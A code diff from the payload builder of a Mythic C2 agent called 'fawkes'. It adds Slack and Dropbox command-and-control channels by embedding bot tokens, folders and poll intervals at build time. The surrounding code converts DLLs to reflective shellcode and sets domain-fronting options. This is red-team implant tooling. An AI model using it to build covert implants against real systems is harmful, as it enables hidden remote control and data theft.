@@ -30,11 +30,11 @@ var buildMu sync.Mutex
 func convertDllToShellcode(dllBytes []byte, functionName string, clearHeader bool) ([]byte, error) {
 	// Use Merlin's Go sRDI implementation - same as working Merlin agent
 	shellcode := srdi.DLLToReflectiveShellcode(dllBytes, functionName, clearHeader, "")
-	
+
 	if len(shellcode) == 0 {
 		return nil, fmt.Errorf("sRDI conversion produced empty shellcode")
 	}
-	
+
 	return shellcode, nil
 }
 
@@ -43,16 +43,16 @@ func is64BitDLL(dllBytes []byte) bool {
 	if len(dllBytes) < 64 {
 		return false
 	}
-	
+
 	// Get offset to PE header from bytes 60-64
 	headerOffset := binary.LittleEndian.Uint32(dllBytes[60:64])
 	if int(headerOffset)+6 > len(dllBytes) {
 		return false
 	}
-	
+
 	// Read machine type from PE header
 	machine := binary.LittleEndian.Uint16(dllBytes[headerOffset+4 : headerOffset+6])
-	
+
 	// 0x8664 = AMD64, 0x0200 = IA64
 	return machine == 0x8664 || machine == 0x0200
 }
@@ -66,7 +66,7 @@ var payloadDefinition = agentstructs.PayloadType{
 	CanBeWrappedByTheFollowingPayloadTypes: []string{},
 	SupportsDynamicLoading:                 false,
 	Description:                            "fawkes agent",
-	SupportedC2Profiles:                    []string{"http", "tcp"},
+	SupportedC2Profiles:                    []string{"http", "tcp", "slack", "dropbox"},
 	MythicEncryptsData:                     true,
 	MessageFormat:                          agentstructs.MessageFormatJSON,
 	BuildParameters: []agentstructs.BuildParameter{
@@ -385,8 +385,75 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 				return payloadBuildResponse
 			}
 			ldflags += fmt.Sprintf(" -X '%s.postURI=%s'", fawkes_main_package, val)
+		} else if key == "slack_bot_token" {
+			val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key)
+			if err != nil {
+				payloadBuildResponse.Success = false
+				payloadBuildResponse.BuildStdErr = err.Error()
+				return payloadBuildResponse
+			}
+			ldflags += fmt.Sprintf(" -X '%s.slackBotToken=%s'", fawkes_main_package, val)
+		} else if key == "slack_channel_id" {
+			val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key)
+			if err != nil {
+				payloadBuildResponse.Success = false
+				payloadBuildResponse.BuildStdErr = err.Error()
+				return payloadBuildResponse
+			}
+			ldflags += fmt.Sprintf(" -X '%s.slackChannelID=%s'", fawkes_main_package, val)
+		} else if key == "slack_poll_interval" {
+			val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key)
+			if err != nil {
+				payloadBuildResponse.Success = false
+				payloadBuildResponse.BuildStdErr = err.Error()
+				return payloadBuildResponse
+			}
+			ldflags += fmt.Sprintf(" -X '%s.slackPollInterval=%d'", fawkes_main_package, int(val))
+		} else if key == "dropbox_token" {
+			val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key)
+			if err != nil {
+				payloadBuildResponse.Success = false
+				payloadBuildResponse.BuildStdErr = err.Error()
+				return payloadBuildResponse
+			}
+			ldflags += fmt.Sprintf(" -X '%s.dropboxToken=%s'", fawkes_main_package, val)
+		} else if key == "dropbox_task_folder" {
+			val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key)
+			if err != nil {
+				payloadBuildResponse.Success = false
+				payloadBuildResponse.BuildStdErr = err.Error()
+				return payloadBuildResponse
+			}
+			ldflags += fmt.Sprintf(" -X '%s.dropboxTaskFolder=%s'", fawkes_main_package, val)
+		} else if key == "dropbox_result_folder" {
+			val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key)
+			if err != nil {
+				payloadBuildResponse.Success = false
+				payloadBuildResponse.BuildStdErr = err.Error()
+				return payloadBuildResponse
+			}
+			ldflags += fmt.Sprintf(" -X '%s.dropboxResultFolder=%s'", fawkes_main_package, val)
+		} else if key == "dropbox_archive_folder" {
+			val, err := payloadBuildMsg.C2Profiles[0].GetStringArg(key)
+			if err != nil {
+				payloadBuildResponse.Success = false
+				payloadBuildResponse.BuildStdErr = err.Error()
+				return payloadBuildResponse
+			}
+			ldflags += fmt.Sprintf(" -X '%s.dropboxArchiveFolder=%s'", fawkes_main_package, val)
+		} else if key == "dropbox_poll_interval" {
+			val, err := payloadBuildMsg.C2Profiles[0].GetNumberArg(key)
+			if err != nil {
+				payloadBuildResponse.Success = false
+				payloadBuildResponse.BuildStdErr = err.Error()
+				return payloadBuildResponse
+			}
+			ldflags += fmt.Sprintf(" -X '%s.dropboxPollInterval=%d'", fawkes_main_package, int(val))
 		}
 	}
+
+	// Select runtime transport implementation from C2 profile
+	ldflags += fmt.Sprintf(" -X '%s.transportType=%s'", fawkes_main_package, payloadBuildMsg.C2Profiles[0].Name)
 
 	// Opsec build parameters: domain fronting, proxy, TLS verification
 	if hostHeader, err := payloadBuildMsg.BuildParameters.GetStringArg("host_header"); err == nil && hostHeader != "" {
